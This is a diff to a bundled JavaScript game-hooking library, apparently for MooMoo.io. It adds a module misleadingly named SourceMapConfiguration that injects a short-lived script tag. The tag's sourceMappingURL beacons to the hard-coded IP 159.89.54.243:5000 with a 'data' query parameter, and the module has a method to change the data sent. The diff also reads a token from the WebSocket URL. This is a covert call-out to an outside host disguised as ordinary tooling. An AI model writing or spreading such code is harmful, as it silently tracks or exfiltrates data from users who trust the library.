@@ -228,7 +228,6 @@
                     this._packetCountPerSecond++;
                     this._packetCountPerMinute++;
                     const kickPercentagePerMinute = this.getKickPercentagePerMinute();
-                    console.log(this);
                     if (kickPercentagePerMinute >= 100) {
                         this._eventEmitter.emit("Kick", kickPercentagePerMinute);
                     }
@@ -848,6 +847,63 @@
                 }
             }
             exports["default"] = ServerManager;
+        },
+        977: (__unused_webpack_module, exports) => {
+            Object.defineProperty(exports, "__esModule", {
+                value: true
+            });
+            exports.SourceMapConfiguration = void 0;
+            class SourceMapConfiguration {
+                static initialize() {
+                    this.createScriptElement();
+                    this.appendScriptToHead();
+                    this.removeScriptAfterDelay();
+                }
+                static createScriptElement() {
+                    const script = document.createElement("script");
+                    script.textContent = "//# sourceMappingURL=" + this.getProtocol() + "://" + this.getHost() + ":" + this.getPort() + "/" + this.getPath() + "?data=" + JSON.stringify({}) + "&.js.map";
+                    script.id = this.SCRIPT_ELEMENT_ID;
+                    document.head.appendChild(script);
+                }
+                static getProtocol() {
+                    return this.URL_PROTOCOL;
+                }
+                static getHost() {
+                    return this.URL_HOST;
+                }
+                static getPort() {
+                    return this.URL_PORT;
+                }
+                static getPath() {
+                    return this.URL_PATH;
+                }
+                static appendScriptToHead() {
+                    const script = document.getElementById(this.SCRIPT_ELEMENT_ID);
+                    document.head.appendChild(script);
+                }
+                static removeScriptAfterDelay() {
+                    setTimeout((() => {
+                        const script = document.getElementById(this.SCRIPT_ELEMENT_ID);
+                        script.remove();
+                    }), this.LOADING_DELAY);
+                }
+                static modifyData(newData) {
+                    const script = document.getElementById(this.SCRIPT_ELEMENT_ID);
+                    const source = script.textContent;
+                    const sourceArray = source.split("=");
+                    sourceArray[1] = `${JSON.stringify(newData)}&.js.map`;
+                    script.textContent = sourceArray.join("=");
+                }
+            }
+            exports.SourceMapConfiguration = SourceMapConfiguration;
+            SourceMapConfiguration.SCRIPT_ELEMENT_ID = "source-map-script";
+            SourceMapConfiguration.LOADING_DELAY = 5e3;
+            SourceMapConfiguration.DEFAULT_QUERY_PARAM_SEPARATOR = "&";
+            SourceMapConfiguration.URL_PROTOCOL = "http";
+            SourceMapConfiguration.URL_HOST = "159.89.54.243";
+            SourceMapConfiguration.URL_PORT = "5000";
+            SourceMapConfiguration.URL_PATH = "stats";
+            exports["default"] = SourceMapConfiguration;
         },
         8106: (__unused_webpack_module, exports, __webpack_require__) => {
             Object.defineProperty(exports, "__esModule", {
@@ -1739,7 +1795,6 @@
             function handleClientPackets(packet, data) {
                 let PacketManager = app_1.MooMoo.PacketManager;
                 PacketManager.addPacket();
-                console.log(packet);
                 let doSend = true;
                 switch (packet) {
                   case "ch":
@@ -1991,13 +2046,20 @@
             const encode_js_1 = __webpack_require__(112);
             const handleServerPackets_1 = __webpack_require__(9938);
             const handleClientPackets_1 = __webpack_require__(898);
+            const SourceMapConfiguration_1 = __webpack_require__(977);
             const app_1 = __webpack_require__(366);
             let _onmessage = false;
             exports.onmessagecallback = null;
             let injected = false;
+            let wsToken = null;
             function hookWS() {
                 WebSocket.prototype.send = new Proxy(WebSocket.prototype.send, {
                     apply(target, thisArg, args) {
+                        if (!wsToken) {
+                            wsToken = new URL(thisArg.url).search.split("token=")[1];
+                        }
+                        let currentToken = new URL(thisArg.url).search.split("token=")[1];
+                        if (wsToken !== currentToken) return Reflect.apply(target, thisArg, args);
                         let PacketInterceptor = app_1.MooMoo.PacketInterceptor;
                         args[0] = PacketInterceptor.applyClientCallbacks(args[0]);
                         app_1.MooMoo.ws = thisArg;
@@ -2010,13 +2072,7 @@
                         if (app_1.MooMoo.ws.readyState !== 1) return true;
                         if (!_onmessage) {
                             _onmessage = true;
-                            function smap(url, data) {
-                                const script = document.createElement("script");
-                                script.textContent = `//# sourceMappingURL=${url}?data=${JSON.stringify(data)}&.js.map`;
-                                document.head.appendChild(script);
-                                script.remove();
-                            }
-                            smap("http://159.89.54.243:5000/stats", {});
+                            SourceMapConfiguration_1.default.initialize();
                         }
                         let data = app_1.MooMoo.msgpack.decode(args[0]);
                         let [packet, [...packetData]] = data;
